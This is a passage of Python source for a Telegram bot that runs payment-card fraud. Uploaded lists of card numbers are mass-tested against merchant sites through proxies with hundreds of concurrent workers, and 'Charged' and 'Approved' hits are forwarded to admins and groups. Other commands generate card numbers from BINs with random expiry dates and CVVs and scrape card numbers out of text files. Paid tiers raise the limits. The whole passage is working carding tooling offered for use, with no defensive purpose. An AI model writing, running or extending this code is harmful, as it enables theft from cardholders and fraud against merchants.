    except Exception:
        pass
    for key in list(active_sessions.keys()):
        if str(msg_id) in key:
            del active_sessions[key]

async def run_chk(data, sites):
    user_id = data['user_id']
    username = data['username']
    is_admin_user = data['is_admin']
    is_prem_user = data['is_premium']
    reply_msg = data['reply_msg']
    proxies = load_proxies()
    if not proxies:
        await bot.send_message(user_id, "❌ No proxies available!", parse_mode='html')
        return
    user_check_locks[user_id] = f"{user_id}_{int(time.time())}"
    session_key = None
    all_results = {
        'charged': [], 'approved': [], 'otp': [], 'dead': [], 'error_cards': [],
        'errors': 0, 'api_errors': 0,
        'total': 0, 'checked': 0, 'start_time': time.time(), 'last_result': None
    }
    try:
        status_msg = await bot.send_message(user_id, "🔄 Processing file...")
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        try:
            os.remove(file_path)
        except Exception:
            pass
        if not cards:
            await status_msg.edit("❌ No valid cards found.")
            return
        if not is_admin_user and is_prem_user and len(cards) > 10000:
            cards = cards[:10000]

        total_cards = len(cards)
        all_results['total'] = total_cards
        session_key = f"{user_id}_{status_msg.id}"
        active_sessions[session_key] = {
            'paused': False,
            'results': all_results
        }
        await update_progress(user_id, status_msg.id, all_results, 0, first_name=username)

        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)

        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(0.2)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                try:
                    card = await asyncio.wait_for(queue.get(), timeout=0.5)
                except Exception:
                    continue
                res = await check_card_with_retry(card, sites, proxies, max_retries=10)
                all_results['checked'] += 1
                all_results['last_result'] = res
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    asyncio.create_task(send_hit_to_admin(res, user_id, "Charged"))
                    asyncio.create_task(send_realtime_hit_group(user_id, res, 'Charged', username))
                    asyncio.create_task(send_realtime_hit_dm(user_id, res, 'Charged', username))
                    asyncio.create_task(auto_pin_charged(user_id, res))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    asyncio.create_task(send_hit_to_admin(res, user_id, "Approved"))
                    asyncio.create_task(send_realtime_hit_dm(user_id, res, 'Approved', username))
                elif res['status'] == 'OTP':
                    all_results['otp'].append(res)
                else:
                    all_results['dead'].append(res)
                    if res['status'] == 'Site Error':
                        all_results['error_cards'].append(res)
                        all_results['errors'] += 1
                        all_results['api_errors'] += 1
                queue.task_done()

                now = time.time()
                if now - last_update_time[0] >= 1.0 or all_results['checked'] == total_cards:
                    last_update_time[0] = now
                    try:
                        await update_progress(user_id, status_msg.id, all_results, all_results['checked'], first_name=username)
                    except Exception:
                        pass

        worker_count = 300 if is_admin_user else (200 if is_prem_user else 30)
        workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            _, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error: {str(e)[:100]}")
    finally:
        if user_id in user_check_locks:
            del user_check_locks[user_id]
        if session_key and session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except Exception:
            pass
        await send_final_results(user_id, all_results)

# ---- /gen ----
@bot.on(events.NewMessage(pattern=r'^/gen\s+(.+)'))
async def gen_cc_command(event):
    user_id = event.sender_id
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply("❌ Premium / Admin only.")
        return
    args = event.pattern_match.group(1).strip().split()
    bins = [a for a in args if a.isdigit() and len(a) <= 6]
    counts = [int(a) for a in args if a.isdigit() and len(a) > 6]
    total_cards = counts[0] if counts else 1000
    if not bins:
        await event.reply("❌ BIN daalo. Example: `/gen 601100 534109 5000`")
        return
    per_bin = max(1, total_cards // len(bins))
    all_cards = []
    for b in bins:
        for _ in range(per_bin):
            rem = 16 - len(b)
            num = b + ''.join(str(random.randint(0, 9)) for _ in range(rem))
            all_cards.append(f"{num[:16]}|{random.randint(1,12):02d}|{random.randint(2026,2030)}|{random.randint(100,999)}")
    all_cards = all_cards[:total_cards]
    filename = f"Generated_CC_{user_id}.txt"
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        for c in all_cards:
            await f.write(f"{c}\n")
    await event.reply(f"✅ Generated {len(all_cards)} cards.", file=filename)
    try:
        os.remove(filename)
    except Exception:
        pass

# ---- /scrape ----
@bot.on(events.NewMessage(pattern=r'^/scrape'))
async def pure_scrape(event):
    user_id = event.sender_id
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ Premium / Admin only."))
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📄 Reply to CC .txt file with /scrape"))
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❌ Sirf .txt file reply kar."))
        return
    status = await event.reply(premium_emoji("<b>⚡ Scraping CCs...</b>"))
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try:
        os.remove(file_path)
    except Exception:
        pass
    raw_cards = extract_cc(content)
    unique_cards = list(dict.fromkeys(raw_cards))
    clean_file = f"Cleaned_CC_{user_id}.txt"
    async with aiofiles.open(clean_file, 'w') as f:
        for card in unique_cards:
            await f.write(f"{card}\n")
    await status.edit(premium_emoji(f"✅ Found <code>{len(raw_cards)}</code>, Unique: <code>{len(unique_cards)}</code>"), parse_mode="html")
    await bot.send_file(user_id, file=clean_file, caption="📄 Cleaned CC File")
    try:
        os.remove(clean_file)
    except Exception:
        pass

# ---- /users ----
@bot.on(events.NewMessage(pattern='/users'))
async def show_users(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users ORDER BY user_id ASC")
        rows = cursor.fetchall()
        conn.close()
    except Exception as e:
        await event.reply(premium_emoji(f"❌ DB error: {e}"))
        return
    filename = f"Users_List_{event.sender_id}.txt"
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        for (uid,) in rows:
            await f.write(f"{uid}\n")
    await event.reply(premium_emoji(f"👥 Total Users: <code>{len(rows)}</code>"), file=filename, parse_mode="html")
    try:
        os.remove(filename)
    except Exception:
        pass

# ---- /Note ----
@bot.on(events.NewMessage(pattern=r'^/Note(?:\s|$)([\s\S]*)'))
async def notice_to_all(event):
    if not is_admin(event.sender_id):
        return
    notice_text = (event.pattern_match.group(1) or "").strip()
    if not notice_text:
        await event.reply(premium_emoji("⚠️ Usage: <code>/Note Your broadcast message</code>"), parse_mode="html")
        return
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = [r[0] for r in cursor.fetchall()]
    conn.close()
    sent, failed = 0, 0
    for uid in users:
        try:
            await bot.send_message(uid, premium_emoji(f"<b>📢 NOTICE ({BOT_NAME}):</b>\n\n{notice_text}"), parse_mode="html")
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1
    await event.reply(premium_emoji(f"✅ Sent: <code>{sent}</code> | ❌ Failed: <code>{failed}</code>"), parse_mode="html")

# ---- MAIN ----
print(f"✅ {BOT_NAME} initialized successfully!")

if __name__ == "__main__":
    user_check_locks.clear()
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("""CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY)""")
    conn.commit()
    conn.close()
    print(f"🔥 {BOT_NAME} ENGAGED 🔥")
    retry_count = 0
    max_retries = 9999
    while retry_count < max_retries:
        try:
            bot.start()
            bot.run_until_disconnected()
            break
        except KeyboardInterrupt:
            print("🛑 Bot stopped manually.")
            break
        except Exception as e:
            retry_count += 1
            print(f"💥 Bot error: {e}")
            time.sleep(5)
